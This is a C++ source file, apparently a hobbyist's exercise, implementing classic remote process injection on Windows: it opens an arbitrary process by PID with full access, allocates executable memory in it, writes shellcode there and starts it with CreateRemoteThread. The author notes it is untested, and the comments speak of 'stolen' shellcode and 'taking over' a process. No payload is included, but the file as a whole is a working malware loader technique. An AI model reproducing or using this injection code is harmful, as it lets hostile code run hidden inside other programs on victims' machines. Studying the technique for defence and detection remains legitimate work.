// did not test this yet so might be some bugs but the concept is there

#include <iostream>
#include "classic_remote_injection.h"

void classic_remote_injection(const unsigned char* shellcode, size_t shellcode_size, DWORD pid){
    
    // well we want to select what process we want to inject it into 
    // well a running process
    // lets assume that PID is initiated in the me main file which is message_popup.cpp
    // ASSUME till i implement it later

//     HANDLE OpenProcess(
//   [in] DWORD dwDesiredAccess,
//   [in] BOOL  bInheritHandle,
//   [in] DWORD dwProcessId
// );

    // hprocess this give u access to existing process
    // open process function geats access to what pid that was passed earlier 
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // basically we want all the access 
        FALSE, // dont want the sc messing with the process handle so false
        pid // pid of the target for me calc
    );

    //basic good programming practice i learnt in class aka big scholar 
    // sanity check 

    if(hProcess == NULL){
        std::cout << "Welp we failed to get a handle to the process, the resason is: " << GetLastError() << std::endl;
        return;
    }

    // no comments here refer to classic_injection.cpp for my wonderful comments

    // basic allocate process but here is difference
    // we are allocating memory to an existing process 
    // not what we created so 

    auto hMemory = VirtualAllocEx(
        hProcess, // points to the process we want to allocate memory to (here is the only difference)
        NULL, //freeball the allocations
        shellcode_size, // reserves the size of the sc
        MEM_COMMIT | MEM_RESERVE, //reserve and commit to mem 
        PAGE_EXECUTE_READWRITE //make it executable so rwx 
    );
    
    // write the stolen sc to the memory of the target process
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess, // points to the target process rememeber here is the difference we are taking over an existing process
        hMemory, // points to the memory where we want to write the sc to
        shellcode, // points to me sc
        shellcode_size, // size of the sc
        &bytesWritten // pointer to variable that receives the number of bytes written
    );

    // well stilld didnt figure out a possible sanity check so here we go 
    std::cout << "Wrote " << bytesWritten << " bytes to memory" << std::endl;

    // create that thread
    DWORD ThreadId;
    // now we use create remote thread instead of create thread because we are ....... good boy
    auto hThread = CreateRemoteThread(
        hProcess, // points to the target process only difference
        NULL, // default sec attributes
        0, // default stack size
        (LPTHREAD_START_ROUTINE)hMemory, // points to the starting address of the sc in the target process
        NULL, // no parameters to pass to the sc
        0, // run the thread immediately after creation
        &ThreadId // pointer to variable that receives the thread identifier
    );

    // following good programming practice and freeing up handles
    WaitForSingleObject(
        hThread,
        INFINITE // wait forever 
    );

    CloseHandle(hThread);
    CloseHandle(hProcess);
}